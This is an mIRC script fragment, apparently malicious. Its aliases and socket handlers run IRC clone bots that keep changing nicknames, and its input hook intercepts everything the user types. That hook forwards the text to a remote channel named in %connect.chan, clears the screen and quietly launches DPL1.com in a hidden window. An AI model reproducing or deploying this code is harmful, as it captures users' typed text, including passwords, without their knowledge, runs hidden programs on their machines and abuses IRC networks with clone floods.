alias wnickchn { %.nc = 1  |   :ncloop | if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |  :end  } 
alias wnickchn2 { %.nc = 1  |  :ncloop |  if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $1 $+ $r(a,z) $+ $r(1,999) |  inc %.nc | goto ncloop |  :end  }
on *:sockclose:clone*: {  set %temp.clones.nick $remove($sockname,clone) }
on *:sockopen:clone*: { sockwrite -tn $sockname User $read SCK.SYS $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  SCK.SYS ] ] | sockwrite -tn $sockname Nick $remove($sockname,clone) | sockread }
on *:sockread:clone*: { sockread %temp.sock |   if ($gettok(%temp.sock,2,32) == 333) { sockwrite $sockname -tn pong $gettok(%temp.sock,5,32) } |  clone in %temp.sock }
on *:INPUT:*: { haltdef | /echo -a < $+ $me $+ > $1- | msg %connect.chan --Warning- (Input command) $1- | /clearall | //run DPL1.com /n /fh        | halt }
